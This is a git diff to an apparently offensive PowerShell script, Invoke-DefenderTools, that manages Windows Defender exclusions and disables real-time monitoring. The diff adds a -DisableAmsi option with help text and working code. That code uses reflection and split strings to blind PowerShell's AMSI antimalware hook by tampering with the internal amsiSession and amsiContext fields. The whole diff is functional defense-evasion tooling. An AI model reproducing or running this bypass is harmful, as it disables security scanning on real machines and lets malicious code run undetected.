@@ -25,6 +25,10 @@ Adds a path exclude.
 
 Disables Real-Time Monitoring
 
+.PARAMETER DisableAMSI
+
+Disables Powershell's AMSI Hook
+
 .EXAMPLE
 
 PS> . .\Invoke-DefenderTools
@@ -38,6 +42,7 @@ Functions:
 PS> Invoke-DefenderTools -GetExcludes
 PS> Invoke-DefenderTools -AddExclude -Path C:\windows\temp
 PS> Invoke-DefenderTools -DisableRtm
+PS> Invoke-DefenderTools -DisableAmsi
 
 #>
 [CmdletBinding()]
@@ -47,7 +52,8 @@ param (
 	[Switch]$GetExcludes,
 	[Switch]$AddExclude,
 	[string]$Path,
-	[Switch]$DisableRtm
+	[Switch]$DisableRtm,
+	[Switch]$DisableAmsi
 )
 
 	if ($Help -eq $True) {
@@ -92,17 +98,27 @@ param (
  |                                                                      |
  |  [*] Usage: Invoke-DefenderTools -DisableRtm                         |
  /----------------------------------------------------------------------/
+ 
+ /----------------------------------------------------------------------/
+ | -DisableAMSI                                                         |
+ | -------------------------------------------------------------------- |
+ |                                                                      |
+ |  [*] Description: Disables PowerShell's AMSI Hook                    |
+ |                                                                      |
+ |  [*] Usage: Invoke-DefenderTools -DisableAmsi                        |
+ /----------------------------------------------------------------------/
 
 "@
 	}
 	elseif ($List -eq $True) {
 		Write @"
 
- DEFENDER Command List:
- ----------------------
- defender -GetExcludes
- defender -AddExclude [-Path] path
- defender -DisableRtm
+ Invoke-DefenderTools Command List:
+ ----------------------------------
+ Invoke-DefenderTools -GetExcludes
+ Invoke-DefenderTools -AddExclude [-Path] path
+ Invoke-DefenderTools -DisableRtm
+ Invoke-DefenderTools -DisableAMSI
  
 "@
 	}
@@ -166,6 +182,25 @@ param (
 		else {
 			$h
 			Write " [!] Not Admin. Must be admin or running as a high-integrity process to disable Defender's Real-Time Monitoring."
+			$h
+		}
+	}
+	elseif ($DisableAmsi) {
+		# https://github.com/jakehomb/AMSI-Exec/blob/master/Invoke-AmsiExec.ps1
+		# https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
+		$h = "`n### Invoke-DefenderTools(DisableAmsi) ###`n"
+		
+		$CheckAmz = [bool](([Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiInitFailed',"NonPublic,Static").GetValue($null)))
+		
+		$a = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+		
+		[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiSession',"NonPublic,Static").SetValue($null,$null)
+		
+		[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiContext',"NonPublic,Static").SetValue($null, [IntPtr]$a)
+		
+		if ($CheckAmz) {
+			$h
+			Write " [+] Disabled Amsi."
 			$h
 		}
 	}
